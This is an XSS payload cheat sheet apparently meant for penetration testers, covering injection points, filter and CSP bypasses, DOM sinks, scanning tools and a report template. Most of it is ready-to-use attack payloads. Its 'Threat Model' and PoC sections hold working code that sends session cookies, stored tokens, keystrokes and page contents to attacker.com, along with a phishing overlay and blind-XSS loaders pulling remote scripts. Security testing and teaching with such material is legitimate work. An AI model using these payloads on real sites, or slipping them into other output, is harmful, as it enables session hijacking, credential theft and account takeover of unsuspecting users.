# XSS - Cross-Site Scripting

## What Is It
Inject malicious scripts into web pages viewed by other users.
Types: Reflected, Stored, DOM-based, Blind

---

## Features / Where to Find
- Search boxes
- Comment/review forms
- Profile fields (name, bio, website)
- Error messages that reflect input
- URL parameters reflected in page
- File names in upload
- HTTP headers reflected (User-Agent, Referer, X-Forwarded-For)
- JSON responses rendered in HTML
- Markdown/Rich text editors
- Import features
- Notification messages
- Chat/messaging features

---

## Actions / Attack Techniques

### Basic Payloads
```javascript
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### Context-Specific Payloads

**Inside HTML attribute:**
```javascript
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onload="alert(1)
```

**Inside JavaScript string:**
```javascript
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>
```

**Inside HTML tag:**
```javascript
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
```

**Filter Bypass Payloads:**
```javascript
# Case variation
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

# No parentheses
<script>alert`1`</script>
<img src=x onerror=alert`1`>

# HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E

# Unicode
\u003cscript\u003ealert(1)\u003c/script\u003e

# SVG
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x></svg>
<svg><set onbegin=alert(1) attributeName=x></svg>
```

---

## Threat Model

### Cookie/Session Theft
```javascript
fetch('https://attacker.com/steal?c='+document.cookie)
new Image().src='https://attacker.com/?c='+document.cookie
```

### localStorage Token Theft
```javascript
fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))
fetch('https://attacker.com/steal?t='+localStorage.getItem('auth'))
```

### Keylogger
```javascript
document.addEventListener('keypress',function(e){
  fetch('https://attacker.com/?k='+e.key)
})
```

### Full Page Capture
```javascript
fetch('https://attacker.com/',{method:'POST',body:document.documentElement.innerHTML})
```

### Account Takeover via CSRF + XSS
```javascript
// Change email
fetch('/api/user/email',{method:'POST',body:'email=attacker@evil.com',headers:{'Content-Type':'application/x-www-form-urlencoded'}})
```

### Phishing Overlay
```javascript
document.body.innerHTML='<form action="https://attacker.com/steal"><h1>Session expired</h1>Password:<input name="p"><button>Login</button></form>'
```

---

## Blind XSS Payloads
```html
<script src="https://YOUR.xss.ht"></script>
"><script src="https://YOUR.xss.ht"></script>
'><script src="https://YOUR.xss.ht"></script>
<img src=x onerror="var s=document.createElement('script');s.src='https://YOUR.xss.ht';document.head.appendChild(s)">
```
Tools: XSSHunter, Canarytokens, Interactsh

---

## DOM XSS Sources
```javascript
// Look for these reading from URL:
document.URL
document.documentURI
document.location
location.href
location.search
location.hash
document.referrer
window.name
```

**DOM XSS Sinks:**
```javascript
// Dangerous sinks:
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout(string)
setInterval(string)
new Function(string)
```

---

## CSP Bypass
```javascript
# JSONP bypass
<script src="https://target.com/jsonp?callback=alert(1)//"></script>

# Angular (old versions)
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

# Via open redirect
<script src="https://target.com/redirect?url=//evil.com/xss.js"></script>
```

---

## Tools
```bash
# Dalfox - automated XSS
dalfox url "https://target.com/search?q=test"
dalfox file urls.txt

# XSStrike
python3 xsstrike.py -u "https://target.com/page?param=test"

# Burp Active Scanner
# Right-click request → Scan → Active scan
```

---

## PoC
```javascript
// Stored XSS PoC that proves impact
// 1. In name field, store:
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// 2. When admin views the page, their session cookie is sent to attacker
// 3. Attacker uses cookie to hijack admin session
```

---

## Report Template
**Title:** Stored XSS in [feature] leads to account takeover
**Severity:** High (Stored) / Medium (Reflected)
**Impact:** Session hijacking, credential theft, admin account takeover
